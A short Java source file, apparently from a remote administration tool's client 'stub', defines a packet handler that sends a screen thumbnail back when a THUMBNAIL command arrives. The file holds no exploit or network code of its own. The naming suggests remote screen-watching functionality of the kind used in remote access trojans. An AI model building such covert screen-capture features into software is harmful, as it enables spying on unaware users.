package com.redpois0n.stub.packets.incoming;

import com.redpois0n.RemoteScreen;

public class PacketTHUMBNAIL extends AbstractIncomingPacket{

	@Override
	public void read() throws Exception {
		RemoteScreen.sendThumbnail();
	}

}
